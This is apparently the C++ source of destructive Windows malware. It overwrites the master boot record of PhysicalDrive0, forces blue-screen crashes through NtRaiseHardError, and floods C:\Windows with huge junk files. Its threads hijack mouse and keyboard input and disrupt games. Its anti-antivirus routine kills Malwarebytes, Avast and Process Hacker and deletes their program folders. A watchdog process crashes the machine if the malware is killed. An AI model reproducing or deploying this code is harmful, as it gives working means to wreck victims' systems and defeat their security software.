#include "feribaszki.h"

int w, h;
BOOL endofsound = FALSE;
BOOL internetaccess = TRUE;

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	srand(static_cast<unsigned int>(time(0)));

	w = GetSystemMetrics(SM_CXSCREEN);
	h = GetSystemMetrics(SM_CYSCREEN);

	int num;
	for (int i = 0; i < 1; i++) {
		num = (rand() % 15) + 1;
		if (num == 1) {
			DWORD dwBytesWritten;
			HANDLE boot = CreateFileW(
				L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
				FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
				OPEN_EXISTING, 0, 0);
			WriteFile(boot, bootcode, 512, &dwBytesWritten, 0);
			CloseHandle(boot);
			Sleep(rand() % 10000);
			killWin();
		}
		else {
			CreateThread(0, 0, &payloadThread, 0, 0, 0);
			CreateThread(0, 0, &TrollThread, 0, 0, 0);
			CreateThread(0, 0, &GameActivity, 0, 0, 0);
			CreateThread(0, 0, &AntiAV, 0, 0, 0);

			int argc;
			LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
			if (argc > 1) {
				if (!lstrcmpW(argv[1], L"/watchdog")) {
					CreateThread(NULL, NULL, &watchdog, NULL, NULL, NULL);
					WNDCLASSEXA c;
					c.cbSize = sizeof(WNDCLASSEXA);
					c.lpfnWndProc = WindowProc;
					c.lpszClassName = "hax";
					c.style = 0;
					c.cbClsExtra = 0;
					c.cbWndExtra = 0;
					c.hInstance = NULL;
					c.hIcon = 0;
					c.hCursor = 0;
					c.hbrBackground = 0;
					c.lpszMenuName = NULL;
					c.hIconSm = 0;
					RegisterClassExA(&c);
					HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
					MSG msg;
					while (GetMessage(&msg, NULL, 0, 0) > 0) {
						TranslateMessage(&msg);
						DispatchMessage(&msg);
					}
				}
			}
			else {
				wchar_t* fn = (wchar_t*)LocalAlloc(LMEM_ZEROINIT, 8192 * 2);
				GetModuleFileName(NULL, fn, 8192);
				for (int i = 0; i < 2; i++)
					ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);
				SHELLEXECUTEINFO info;
				info.cbSize = sizeof(SHELLEXECUTEINFO);
				info.lpFile = fn;
				info.lpParameters = L"/main";
				info.fMask = SEE_MASK_NOCLOSEPROCESS;
				info.hwnd = NULL;
				info.lpVerb = NULL;
				info.lpDirectory = NULL;
				info.hInstApp = NULL;
				info.nShow = SW_SHOWDEFAULT;
				ShellExecuteEx(&info);

				SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
			}
		}
	}
}
DWORD WINAPI TrollThread(LPVOID parameter) {
	Sleep(60000);
	int randomize;
	for (;;) {
		randomize = (rand() % 8) + 1;
		if (randomize == 1) {
			POINT mouse;
			Sleep(2500);
			for (int i = 0; i < 5; i++) {
				GetCursorPos(&mouse);
				SetCursorPos(mouse.x + rand() % 800 + 1, mouse.y + rand() % 200 + 1);
				Sleep(rand() % 1000);
				SetCursorPos(mouse.x + rand() % 600 + 1, mouse.y - rand() % 100 + 1);
				Sleep(rand() % 2500);
			}
		}
		if (randomize == 2) {
			for (int i = 0; i < 5; i++) {
				Sleep(rand() % 12000);
				SwapMouseButton(TRUE);
				Sleep(rand() % 2500);
				SwapMouseButton(FALSE);
				Sleep(rand() % 3000);
			}
		}
		if (randomize == 3) {
			POINT cursor;
			GetCursorPos(&cursor);
			for (int i = 0; i < 200; i++) {
				SetCursorPos(cursor.x + rand() % 3 + 1, cursor.y + rand() % 3 + 1);
				Sleep(70);
				SetCursorPos(cursor.x + rand() % 5 + 1, cursor.y - rand() % 5 + 1);
				Sleep(10);

			}
		}
		if (randomize == 4) {
			INPUT input;
			for (int i = 0; i < 5;i++) {
				input.type = INPUT_KEYBOARD;
				input.ki.wVk = (rand() % (0x5a - 0x30)) + 0x30;
				SendInput(1, &input, sizeof(INPUT));
				Sleep((rand() % 2500) + 2500);
			}
		}
		if (randomize == 5) {
			BlockInput(true);
			Sleep(rand() % 5000);
			BlockInput(false);
			Sleep(5500);
		}
		if (randomize == 6) {
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			Sleep((rand() % 8000) + 2500);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			Sleep(rand() % 10000);
		}
		if (randomize == 7) {
			if (internetaccess) {
				system("ipconfig /release");
				internetaccess = FALSE;
			}
			if (!internetaccess) {
				system("ipconfig /renew");
				internetaccess = TRUE;
			}
			Sleep(5000);
		}
		if (randomize == 8) {
			int filemode, randomize;
			FILE* file;
			DWORD dwBytesWritten;
			for (int i = 0; i < 1; i++) {
				filemode = (rand() % 5) + 1;
				if (filemode == 1) {
					char data[102000];
					ZeroMemory(data, (sizeof & data));
					if (file = fopen("C:\\gay.exe", "r")) {
						fclose(file);
						randomize = (rand() % 2) + 1;
						if (randomize == 1) {
							remove("C:\\gay.exe");
							Sleep(10);
						}
						Sleep(10);
					}
					else {
						HANDLE hfile = CreateFileA(
							"C:\\Windows\\gay.exe",
							GENERIC_WRITE,
							0, NULL, CREATE_NEW,
							FILE_ATTRIBUTE_NORMAL, NULL);
						for (int i = 0; i < 2000; i++) {
							WriteFile(hfile, data, 999999, &dwBytesWritten, 0);
						}
						CloseHandle(hfile);
					}
				}
				if (filemode == 2) {
					char data[999999];
					ZeroMemory(data, (sizeof & data));
					if (file = fopen("C:\\freeporn.zip", "r")) {
						fclose(file);
						randomize = (rand() % 2) + 1;
						if (randomize == 1) {
							remove("C:\\freeporn.zip");
							Sleep(10);
						}
						Sleep(10);
					}
					else {
						HANDLE hfile2 = CreateFileA(
							"C:\\Windows\\freeporn.zip",
							GENERIC_WRITE,
							0, NULL, CREATE_NEW,
							FILE_ATTRIBUTE_NORMAL, NULL);
						for (int i = 0; i < 2000; i++) {
							WriteFile(hfile2, data, 999999, &dwBytesWritten, 0);
						}
						CloseHandle(hfile2);
					}
				}
				if (filemode == 3) {
					char data[512000];
					ZeroMemory(data, (sizeof& data));
					if (file = fopen("C:\\fff.f", "r")) {
						fclose(file);
						randomize = (rand() % 2) + 1;
						if (randomize == 1) {
							remove("C:\\fff.f");
							Sleep(10);
						}
						Sleep(10);
					}
					else {
						HANDLE hfile3 = CreateFileA(
							"C:\\Windows\\fff.f",
							GENERIC_WRITE,
							0, NULL, CREATE_NEW,
							FILE_ATTRIBUTE_NORMAL, NULL);
						for (int i = 0; i < 2000; i++) {
							WriteFile(hfile3, data, 999999, &dwBytesWritten, 0);
						}
						CloseHandle(hfile3);
					}
				}
				if (filemode == 4) {
					char data[409600];
					ZeroMemory(data, (sizeof& data));
					if (file = fopen("C:\\LSD.f", "r")) {
						fclose(file);
						randomize = (rand() % 2) + 1;
						if (randomize == 1) {
							remove("C:\\LSD.f");
							Sleep(10);
						}
						Sleep(10);
					}
					else {
						HANDLE hfile4 = CreateFileA(
							"C:\\Windows\\LSD.f",
							GENERIC_WRITE,
							0, NULL, CREATE_NEW,
							FILE_ATTRIBUTE_NORMAL, NULL);
						for (int i = 0; i < 2000; i++) {
							WriteFile(hfile4, data, 999999, &dwBytesWritten, 0);
						}
						CloseHandle(hfile4);
					}
				}
				if (filemode == 5) {
					char data[676767];
					ZeroMemory(data, (sizeof & data));
					if (file = fopen("C:\\L.KID", "r")) {
						fclose(file);
						randomize = (rand() % 2) + 1;
						if (randomize == 1) {
							remove("C:\\L.KID");
							Sleep(10);
						}
						Sleep(10);
					}
					else {
						HANDLE hfile5 = CreateFileA(
							"C:\\Windows\\L.KID",
							GENERIC_WRITE,
							0, NULL, CREATE_NEW,
							FILE_ATTRIBUTE_NORMAL, NULL);
						for (int i = 0; i < 2000; i++) {
							WriteFile(hfile5, data, 999999, &dwBytesWritten, 0);
						}
						CloseHandle(hfile5);
					}
				}
				Sleep(500);
			}
		}
		Sleep(rand() % 5225);
	}

	return 0;
}
DWORD WINAPI GameActivity(LPVOID parameter) {
	for (;;) {
		INPUT ip;
		ip.type = INPUT_KEYBOARD;
		ip.ki.wScan = 0;
		ip.ki.time = 0;
		ip.ki.dwExtraInfo = 0;
		if (FindProcess(L"League of Legends.exe")) {
			int lolkey;
			for (int i = 0; i < 25; i++) {
				lolkey = (rand() % 6) + 1;
				if (lolkey == 1) {
					ip.ki.wVk = 0x51; //q 
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
				}
				if (lolkey == 2) {
					ip.ki.wVk = 0x57;//w
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
				}
				if (lolkey == 3) {
					ip.ki.wVk = 0x45;//e
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
					Sleep(500);
					SendInput(1, &ip, sizeof(INPUT));
				}
				if (lolkey == 4) {
					ip.ki.wVk = 0x52;//r
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
					Sleep(500);
					SendInput(1, &ip, sizeof(INPUT));
				}
				if (lolkey == 5) {
					ip.ki.wVk = 0x44;//d
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
				}
				if (lolkey == 6) {
					ip.ki.wVk = 0x46;//f
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));

				}
				Sleep(rand() % 60000);
			}
			system("taskkill /f /im League of Legends.exe");
		}
		if (FindProcess(L"RobloxPlayerBeta.exe")) {
			for (int i = 0; i < 10; i++) {
				keybd_event(VK_SPACE, 0, 0, 0);
				Sleep(2500);
				keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
				Sleep(rand() % 60000);
			}
			system("taskkill /f /im RobloxPlayerBeta.exe");
		}
		if (FindProcess(L"javaw.exe")) {
			INPUT ip;

			ip.type = INPUT_KEYBOARD;
			ip.ki.wScan = 0;
			ip.ki.time = 0;
			ip.ki.dwExtraInfo = 0;
			int mckey;
			for (int i = 0; i < 5; i++) {
				mckey = (rand() % 3) + 1;
				if (mckey == 1) {
					ip.ki.wVk = 0x1B;
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
					Sleep(2500);
				}
				if (mckey == 1) {
					ip.ki.wVk = 0x20;
					ip.ki.dwFlags = 0;
					SendInput(1, &ip, sizeof(INPUT));
					Sleep(2500);
				}
				if (mckey == 1) {
					keybd_event('e', 0, 0, 0);
					Sleep(1000);
					keybd_event('e', 0, KEYEVENTF_KEYUP, 0);
					Sleep(rand() % 5000);
				}
				Sleep(rand() % 60000);
			}
			system("taskkill /f /im RobloxPlayerBeta.exe");
		}
		Sleep(5000);
	}

	return 0;
}
DWORD WINAPI AntiAV(LPVOID parameter) {
	for (;;) {
		HWND MBSetup;
		if (MBSetup = FindWindowA(NULL, "MalwareBytes")) {
			killWin();
		}
		if (FindProcess(L"mbamtray.exe")) {
			system("taskkill /f /im mbamtray.exe");
			system("taskkill /f /im MBAMService.exe");
			system("del C:\Program Files\Malwarebytes\Anti-Malware\*.* /s /q /a");
			Sleep(100);
			killWin();
		}
		if (FindProcess(L"AvastUI.exe")) {
			system("taskkill /f /im AvastUI.exe");
			system("taskkill /f /im aswToolsSvc.exe");
			system("taskkill /f /im aswEngSrv.exe");
			system("taskkill /f /im wsc_proxy.exe");
			system("taskkill /f /im AvastSvc.exe");
			system("taskkill /f /im aswidsagent.exe");
			system("del C:\Program Files\Avast Software\Avast\*.* /s /q /a");
			killWin();
		}
		if (FindProcess(L"ProcessHacker.exe")) {
			system("taskkill /f /im ProcessHacker.exe");
			Sleep(10);
		}
		Sleep(1500);
	}
	return 0;
}
LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWin();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}
DWORD WINAPI watchdog(LPVOID parameter) {
	int oproc = 0;
	char* fn = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);
	Sleep(1000);
	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);
		Process32First(snapshot, &proc);
		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char* fn2 = (char*)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);
			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}
			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));
		CloseHandle(snapshot);
		if (nproc < oproc) {
			killWin();
		}
		oproc = nproc;
		Sleep(10);
	}
}
void killWin() {
	PlaySound(MAKEINTRESOURCE(IDR_WAVE1), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
	endofsound = TRUE;
	while (endofsound) {
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		HANDLE token;
		TOKEN_PRIVILEGES privileges;

		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
		privileges.PrivilegeCount = 1;
		privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
		Sleep(1000);
	}
}